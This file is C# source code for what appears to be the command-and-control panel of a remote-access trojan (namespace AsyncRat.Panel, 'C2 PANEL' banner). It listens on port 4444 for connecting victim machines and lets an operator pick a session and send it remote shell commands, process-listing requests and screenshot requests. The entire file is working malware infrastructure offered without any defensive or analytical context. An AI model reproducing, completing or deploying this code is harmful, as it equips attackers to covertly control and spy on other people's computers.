using System.Net;
using System.Net.Sockets;
using AsyncRat.Client.Network;

namespace AsyncRat.Panel;

public static class Program
{
    public static async Task<int> Main(string[] args)
    {
        Console.WriteLine(Banner);

        var host = args.Length > 0 ? args[0] : "0.0.0.0";
        var port = args.Length > 1 && int.TryParse(args[1], out var p) ? p : 4444;

        var mgr = new SessionManager();
        var listener = new TcpListener(IPAddress.Parse(host), port);
        listener.Start();
        Console.WriteLine($"[*] Listening on {host}:{port}");

        var acceptTask = AcceptLoop(listener, mgr);
        await CommandLoop(mgr);

        listener.Stop();
        await acceptTask;
        return 0;
    }

    private static async Task AcceptLoop(TcpListener listener, SessionManager mgr)
    {
        try
        {
            while (true)
            {
                var tcp = await listener.AcceptTcpClientAsync();
                var ep = tcp.Client.RemoteEndPoint?.ToString() ?? "unknown";
                var id = mgr.Register(tcp);
                Console.WriteLine($"\n[+] Session {id} connected from {ep}");
                Console.Write("panel> ");
            }
        }
        catch (ObjectDisposedException) { }
    }

    private static async Task CommandLoop(SessionManager mgr)
    {
        int? active = null;
        while (true)
        {
            Console.Write("panel> ");
            var line = Console.ReadLine();
            if (line is null) break;

            var parts = line.Trim().Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) continue;

            switch (parts[0].ToLowerInvariant())
            {
                case "sessions":
                    mgr.PrintSessions();
                    break;
                case "use" when parts.Length > 1 && int.TryParse(parts[1], out var sid):
                    active = mgr.HasSession(sid) ? sid : null;
                    Console.WriteLine(active is not null ? $"[*] Active session: {sid}" : "[!] Invalid session");
                    break;
                case "shell" when active is not null && parts.Length > 1:
                    var resp = await mgr.SendCommandAsync(active.Value, $"SHELL|{parts[1]}");
                    Console.WriteLine(resp);
                    break;
                case "ps" when active is not null:
                    Console.WriteLine(await mgr.SendCommandAsync(active.Value, "PS"));
                    break;
                case "screenshot" when active is not null:
                    Console.WriteLine(await mgr.SendCommandAsync(active.Value, "SCREENSHOT"));
                    break;
                case "exit" or "quit":
                    return;
                default:
                    Console.WriteLine("[!] Unknown command. Try: sessions, use, shell, ps, screenshot, exit");
                    break;
            }
        }
    }

    private const string Banner =
        """

         ██████╗██████╗     ██████╗  █████╗ ███╗   ██╗███████╗██╗
        ██╔════╝╚════██╗    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║
        ██║      █████╔╝    ██████╔╝███████║██╔██╗ ██║█████╗  ██║
        ██║     ██╔═══╝     ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██║
        ╚██████╗███████╗    ██║     ██║  ██║██║ ╚████║███████╗███████╗
         ╚═════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝

        """;
}
